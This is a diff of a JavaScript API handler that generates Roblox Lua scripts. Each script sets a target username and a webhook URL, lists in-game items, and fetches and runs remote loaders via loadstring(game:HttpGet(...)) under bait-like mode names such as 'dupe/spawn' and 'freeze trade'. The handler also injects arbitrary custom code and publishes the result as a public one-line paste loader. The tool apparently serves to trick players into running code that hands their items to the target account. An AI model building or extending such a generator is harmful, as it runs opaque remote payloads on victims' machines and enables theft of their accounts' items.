@@ -1,406 +1,284 @@
-```js
-// api/generate.js
+@@ -1,29 +1,52 @@
 
+// api/generate.js
 export default async function handler(req, res) {
     if (req.method !== 'POST') {
-        return res.status(405).json({
-            error: 'Method not allowed'
-        });
+        return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    var body = req.body || {};
+    const { username, webhook, mode, brainrots, skins, gears, customCode, userId } = req.body;
 
-    var username = body.username;
-    var webhook = body.webhook;
-    var mode = body.mode;
-    var brainrots = body.brainrots || [];
-    var skins = body.skins || [];
-    var gears = body.gears || [];
-    var customCode = body.customCode || '';
-    var userId = body.userId;
+
+
+
+
+
+
+
+
 
     if (!username) {
-        return res.status(400).json({
-            error: 'Username is required'
-        });
+        return res.status(400).json({ error: 'Username is required' });
     }
 
     try {
-        var script = buildScript(
-            username,
-            webhook,
-            mode,
-            brainrots,
-            skins,
-            gears,
-            customCode
-        );
+        const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || []);
 
-        var pasteId = await saveToInternalPaste(
+
+
+
+
+
+
+
+
+        const pasteId = await saveToInternalPaste(
             script,
-            'Script para ' + username,
+            `Script para ${username}`,
             userId
         );
 
-        var baseUrl =
-            process.env.BASE_URL || 'https://oblivionhub.xyz';
+        const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
+        const rawUrl = `${baseUrl}/api/paste?id=${pasteId}&raw=true`;
 
-        var rawUrl =
-            baseUrl +
-            '/api/paste?id=' +
-            encodeURIComponent(pasteId) +
-            '&raw=true';
+
+
 
         return res.status(200).json({
-            loadstring:
-                'loadstring(game:HttpGet("' +
-                rawUrl +
-                '"))()',
+            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
+
 
             script: script,
-
             pasteUrl: rawUrl,
-
             pasteId: pasteId,
-
-            obfuscated: false
-        });
+@@ -32,79 +55,231 @@ export default async function handler(req, res) {
 
     } catch (error) {
         console.error('Error general:', error);
+        return res.status(500).json({ error: error.message });
 
-        return res.status(500).json({
-            error: error && error.message
-                ? error.message
-                : 'Internal server error'
-        });
+
+
     }
 }
 
 
 // ============================================================
-// CONSTRUIR SCRIPT
+//  CONSTRUIR SCRIPT
 // ============================================================
+function buildScript(username, webhook, mode, brainrots, skins, gears) {
 
-function buildScript(
-    username,
-    webhook,
-    mode,
-    brainrots,
-    skins,
-    gears,
-    customCode
-) {
 
-    function escapeLuaString(value) {
-        return String(value)
-            .replace(/\\/g, '\\\\')
-            .replace(/"/g, '\\"')
-            .replace(/\r/g, '\\r')
-            .replace(/\n/g, '\\n');
+
+
+
+
+
+
+    function luaTable(arr, indent = '    ') {
+        if (arr.length === 0) return '{}';
+        const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
+        return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
+
+
+
+
+
+
+
+
+
     }
 
-
-    function luaTable(arr) {
-
-        if (!Array.isArray(arr) || arr.length === 0) {
-            return '{}';
-        }
-
-        var result = ['{'];
-
-        for (var i = 0; i < arr.length; i++) {
-            result.push(
-                '    ["' +
-                escapeLuaString(arr[i]) +
-                '"] = true' +
-                (i < arr.length - 1 ? ',' : '')
-            );
-        }
-
-        result.push('}');
-
-        return result.join('\n');
-    }
+    let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
+    script += `getgenv().WEBHOOK_URL = "${webhook ? webhook.replace(/"/g, '\\"') : 'WEBHOOK_URL'}"\n`;
+    script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
+    script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
+    script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;
 
 
-    var safeUsername =
-        escapeLuaString(username);
-
-    var safeWebhook =
-        webhook
-            ? escapeLuaString(webhook)
-            : 'WEBHOOK_URL';
 
 
-    var script = '';
-
-    script +=
-        'getgenv().TARGET_USERNAME = "' +
-        safeUsername +
-        '"\n';
-
-    script +=
-        'getgenv().WEBHOOK_URL = "' +
-        safeWebhook +
-        '"\n';
-
-    script +=
-        'getgenv().NORMAL_BRAINROTS = ' +
-        luaTable(brainrots) +
-        '\n';
-
-    script +=
-        'getgenv().NORMAL_BASE_SKINS = ' +
-        luaTable(skins) +
-        '\n';
-
-    script +=
-        'getgenv().NORMAL_GEARS = ' +
-        luaTable(gears) +
-        '\n';
 
 
-    // ========================================================
-    // LUARMOR BASE
-    // ========================================================
-
-    var GUI_BASE =
-        'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';
 
 
-    // ========================================================
-    // GITHUB
-    // ========================================================
-
-    var GUI_AP =
-        'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua';
-
-    var GUI_DUPE =
-        'https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua';
-
-    var GUI_SNIPER =
-        'https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua';
 
 
-    // ========================================================
-    // NORMAL
-    // ========================================================
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    const guiLoadstrings = {
+        adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()',
+        freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
+        dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
+
+    };
+
+
+    let fullScript = script;
+
+
+
+
 
     if (mode === 'normal') {
 
-        script +=
-            '\n' +
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_BASE +
-            '"))()\n' +
-            'end)';
-
-    }
+        fullScript += `
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)`;
+    } else if (mode in guiLoadstrings) {
 
 
-    // ========================================================
-    // ADMIN PANEL
-    // LUARMOR + GUIAP.LUA
-    // ========================================================
-
-    else if (mode === 'adminpanel') {
-
-        script +=
-            '\n' +
-            '-- GUI ADMIN PANEL\n' +
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_BASE +
-            '"))()\n' +
-            'end)\n\n' +
-
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_AP +
-            '"))()\n' +
-            'end)';
-
-    }
 
 
-    // ========================================================
-    // DUPE / SPAWN
-    // LUARMOR + GUIDUPE.LUA
-    // ========================================================
-
-    else if (mode === 'dupespawn') {
-
-        script +=
-            '\n' +
-            '-- GUI DUPE / SPAWN\n' +
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_BASE +
-            '"))()\n' +
-            'end)\n\n' +
-
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_DUPE +
-            '"))()\n' +
-            'end)';
-
-    }
 
 
-    // ========================================================
-    // CODE SNIPER
-    // LUARMOR + SNIPER.LUA
-    // ========================================================
-
-    else if (mode === 'codesniper') {
-
-        script +=
-            '\n' +
-            '-- GUI CODE SNIPER\n' +
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_BASE +
-            '"))()\n' +
-            'end)\n\n' +
-
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_SNIPER +
-            '"))()\n' +
-            'end)';
-
-    }
 
 
-    // ========================================================
-    // FREEZE TRADE
-    // ========================================================
+        fullScript += `
 
-    else if (mode === 'freezetrade') {
-
-        script +=
-            '\n' +
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_BASE +
-            '"))()\n' +
-            'end)';
-
-    }
+task.spawn(function()
+    ${guiLoadstrings[mode]}
 
 
-    // ========================================================
-    // CUSTOM
-    // ========================================================
-
-    else if (mode === 'custom') {
-
-        script +=
-            '\n' +
-            'task.spawn(function()\n' +
-            '    loadstring(game:HttpGet("' +
-            GUI_BASE +
-            '"))()\n' +
-            'end)';
 
 
-        if (
-            customCode &&
-            String(customCode).trim()
-        ) {
 
-            var formattedCustomCode =
-                String(customCode)
-                    .replace(/\r?\n/g, '\n    ');
+end)`;
+    } else if (mode === 'custom') {
 
-            script +=
-                '\n\n' +
-                'task.spawn(function()\n' +
-                '    ' +
-                formattedCustomCode +
-                '\n' +
-                'end)';
+
+
+
+
+
+
+
+        fullScript += `
+
+
+
+
+
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)`;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        if (customCode && customCode.trim()) {
+            fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
+
+
+
+
+
         }
-
     }
 
 
-    else {
-
-        throw new Error(
-            'Unknown generation mode: ' + mode
-        );
-    }
-
-
-    return script;
+    return fullScript;
 }
 
 
 // ============================================================
-// GUARDAR EN PASTEFY INTERNO
+//  GUARDAR EN PASTEFY INTERNO (devuelve solo el ID)
 // ============================================================
+async function saveToInternalPaste(content, title, userId) {
+    const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
 
-async function saveToInternalPaste(
-    content,
-    title,
-    userId
-) {
+    const response = await fetch(`${baseUrl}/api/paste`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: content,
+            title: title || 'Untitled',
+            userId: userId || null,
+            public: true
+        })
+    });
 
-    var baseUrl =
-        process.env.BASE_URL || 'https://oblivionhub.xyz';
 
 
-    var response = await fetch(
-        baseUrl + '/api/paste',
-        {
-            method: 'POST',
 
-            headers: {
-                'Content-Type': 'application/json'
-            },
 
-            body: JSON.stringify({
-                content: content,
-                title: title || 'Untitled',
-                userId: userId || null,
-                public: true
-            })
-        }
-    );
+
+
+
+
+
+
 
 
     if (!response.ok) {
 
-        var text = '';
+        const error = await response.json();
+        throw new Error(error.error || 'Error al guardar el paste');
 
-        try {
-            text = await response.text();
-        } catch (_) {
-            text = '';
-        }
 
-        throw new Error(
-            'Paste API error ' +
-            response.status +
-            (text ? ': ' + text : '')
-        );
+
+
     }
 
-
-    var data = await response.json();
-
-
-    if (!data || !data.id) {
-        throw new Error(
-            'Paste API did not return an ID'
-        );
-    }
-
+    const data = await response.json();
 
     return data.id;
 }
-```
